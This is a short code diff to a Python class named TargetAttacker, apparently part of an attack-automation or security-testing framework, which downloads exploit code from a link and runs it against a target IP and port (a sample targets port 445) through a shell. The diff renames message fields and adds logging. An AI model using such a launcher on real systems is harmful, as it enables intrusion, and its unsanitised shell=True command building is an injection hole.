@@ -41,11 +41,11 @@ class TargetAttacker(Processor):
         return
 
 
-    def run_cmd(self, debug):
+    def run_cmd(self, debug = False):
         self.debug = debug
-        target_ip = self.cmd["target_ip"]
+        target_ip = self.cmd["dst_ip"]
         self.link = self.cmd['download']  # 공격 코드 다운로드 링크
-        target_port = self.cmd['target_port']
+        target_port = self.cmd['dst_port']
 
         if self.debug:
             pass
@@ -58,6 +58,7 @@ class TargetAttacker(Processor):
             ("<PORT>", str(target_port))
         ]
         usage = self.cmd_after_replacement(self.cmd['usage'], replacements)
+        logger.info(f"[target] Usage: {usage}")
 
         subprocess.call(usage, shell=True)
 
@@ -71,11 +72,12 @@ class TargetAttacker(Processor):
 
 if __name__ == '__main__':
     msg = {
-        "type": "attack_secu",
-        "download": f"http://localhost:9000/exploit/1",
-        "target_ip": "172.30.1.26",
-        "target_port": 445,
-        "usage": "python <FILE> <IP>",
+    "type": "attack_target",
+    "dst_ip" : "127.0.0.1",
+    "dst_port" : 445,
+    "download": f"http://localhost:9000/exploit/{id}",
+    "file_size": 1000,
+    "usage": "python <FILE> <IP>",
     }
 
     a = TargetAttacker(msg)
